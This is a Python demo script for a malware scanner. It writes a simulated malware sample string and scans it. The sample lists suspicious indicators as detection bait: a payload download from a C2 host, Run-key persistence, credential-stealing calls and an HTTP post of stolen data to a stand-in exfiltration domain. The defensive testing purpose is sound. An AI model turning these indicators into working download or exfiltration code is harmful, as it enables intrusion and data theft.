#!/usr/bin/env python3
"""
üé¨ ULTRA MALWARE SCANNER - Simplified Demo
Advanced Threat Detection & Hacker Tracking Showcase
"""

import os
import sys
import time
import json
from pathlib import Path

# Add the current directory to Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Rich console for beautiful output
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich import box
    from rich.align import Align
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None

class UltraMalwareDemoSimple:
    """
    Ultra Malware Scanner Live Demonstration - Simplified Version
    """
    
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        
    def create_demo_sample(self):
        """Create a simple demo sample"""
        sample_content = """
        // Simulated malware sample for demonstration
        // This is NOT actual malware - purely for testing
        
        CreateRemoteThread();
        WriteProcessMemory();
        VirtualAlloc();
        URLDownloadToFile("http://apt1-c2-server.com/payload.exe");
        
        // APT1 indicators
        auriga_backdoor = "comment crew operation";
        RegSetValueEx("HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run");
        
        // IP address
        char ip_addr[] = "61.130.45.23";
        
        // Banking trojan indicators
        keylogger_init();
        steal_credentials();
        
        // Encryption indicators
        AES_encrypt(data, key);
        base64_encode(payload);
        
        // Network communication
        socket_connect("185.159.158.42", 8080);
        http_post("http://malicious-domain.com/exfiltrate", stolen_data);
        """
        
        # Save demo sample
        demo_file = "demo_malware_sample.txt"
        with open(demo_file, 'w', encoding='utf-8') as f:
            f.write(sample_content)
        
        return demo_file
    
    def run_simplified_demo(self):
        """Run simplified demonstration"""
        
        if self.console:
            self._display_banner()
        else:
            print("=" * 60)
            print("ü¶† ULTRA MALWARE SCANNER - Elite Edition")
            print("Advanced Multi-Vector Malware Detection & Hacker Tracking")
            print("=" * 60)
        
        # Create demo sample
        demo_file = self.create_demo_sample()
        
        try:
            # Import and initialize scanner
            if self.console:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    console=self.console
                ) as progress:
                    task = progress.add_task("üöÄ Initializing Ultra Scanner...", total=100)
                    progress.update(task, advance=50)
                    
                    from ultra_malware_scanner import UltraMalwareScanner
                    scanner = UltraMalwareScanner()
                    progress.update(task, advance=100)
            else:
                print("Initializing Ultra Malware Scanner...")
                from ultra_malware_scanner import UltraMalwareScanner
                scanner = UltraMalwareScanner()
            
            # Perform scan
            if self.console:
                self.console.print("\\nüîç [bold]Scanning Demo Sample...[/bold]")
            else:
                print("\\nScanning demo sample...")
            
            results = scanner.scan_file(demo_file)
            
            # Display results
            self._display_results(results)
            
            # Save report
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            report_file = f"ultra_demo_report_{timestamp}.json"
            with open(report_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            if self.console:
                self.console.print(f"\\nüìÑ [green]Report saved:[/green] {report_file}")
            else:
                print(f"\\nReport saved: {report_file}")
            
            # Clean up
            if os.path.exists(demo_file):
                os.remove(demo_file)
                
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Demo error: {e}[/red]")
            else:
                print(f"Demo error: {e}")
    
    def _display_banner(self):
        """Display demo banner"""
        banner = """
[bold red]ü¶† ULTRA MALWARE SCANNER ü¶†[/bold red]
[bold cyan]Elite Edition - Live Demonstration[/bold cyan]

[italic]Advanced Multi-Vector Malware Detection & Hacker Tracking[/italic]
"""
        
        self.console.print(Panel(
            Align.center(banner),
            border_style="bright_red",
            box=box.DOUBLE
        ))
    
    def _display_results(self, results):
        """Display scan results"""
        if not self.console:
            print("\\n=== SCAN RESULTS ===")
            threat_score = results.get("threat_score", {})
            print(f"Threat Level: {threat_score.get('threat_level', 'UNKNOWN')}")
            print(f"Threat Score: {threat_score.get('total_score', 0)}/100")
            
            # Show detected threats
            malware_families = results.get("signature_analysis", {}).get("malware_families", [])
            if malware_families:
                print("\\nDetected Threats:")
                for family in malware_families:
                    print(f"  - {family['family']} ({family['category']}) - {family['confidence']*100:.0f}% confidence")
            
            # Show behavioral analysis
            behaviors = results.get("behavioral_analysis", {}).get("detected_behaviors", [])
            if behaviors:
                print("\\nBehavioral Analysis:")
                for behavior in behaviors:
                    print(f"  - {behavior['behavior']}: {behavior['severity']}")
            
            return
        
        # Rich display
        threat_score = results.get("threat_score", {})
        threat_level = threat_score.get("threat_level", "UNKNOWN")
        total_score = threat_score.get("total_score", 0)
        
        color_map = {
            "CRITICAL": "bright_red",
            "HIGH": "red",
            "MEDIUM": "yellow", 
            "LOW": "blue",
            "MINIMAL": "green"
        }
        color = color_map.get(threat_level, "white")
        
        # Main results
        self.console.print(Panel(
            f"[bold {color}]Threat Level: {threat_level}[/bold {color}]\\n"
            f"[bold]Threat Score: {total_score}/100[/bold]",
            title="üéØ Threat Assessment",
            border_style=color
        ))
        
        # Detected threats
        malware_families = results.get("signature_analysis", {}).get("malware_families", [])
        if malware_families:
            table = Table(title="ü¶† Detected Threats", box=box.ROUNDED)
            table.add_column("Family", style="bold red")
            table.add_column("Category", style="cyan")
            table.add_column("Confidence", style="green")
            
            for family in malware_families:
                table.add_row(
                    family["family"].upper(),
                    family["category"].replace("_", " ").title(),
                    f"{family['confidence']*100:.0f}%"
                )
            
            self.console.print(table)
        
        # Show key findings
        file_info = results.get("file_info", {})
        static_analysis = results.get("static_analysis", {})
        
        self.console.print(f"\\nüìä [bold]Technical Analysis[/bold]")
        self.console.print(f"  File Size: {file_info.get('file_size_mb', 'N/A')} MB")
        self.console.print(f"  Entropy: {static_analysis.get('entropy', 'N/A')}")
        self.console.print(f"  Suspicious Strings: {len(static_analysis.get('strings', {}).get('suspicious_strings', []))}")
        
        # Recommendations
        recommendations = results.get("recommendations", [])
        if recommendations:
            self.console.print(f"\\nüí° [bold]Key Recommendations[/bold]")
            for rec in recommendations[:3]:  # Show top 3
                self.console.print(f"  {rec}")

def main():
    """Main demonstration function"""
    try:
        demo = UltraMalwareDemoSimple()
        demo.run_simplified_demo()
        
        if demo.console:
            demo.console.print("\\nüéâ [bold green]Demo Complete![/bold green]")
        else:
            print("\\n=== Demo Complete! ===")
            
    except KeyboardInterrupt:
        print("\\nDemo stopped by user")
    except Exception as e:
        print(f"\\nDemo error: {e}")

if __name__ == "__main__":
    main()
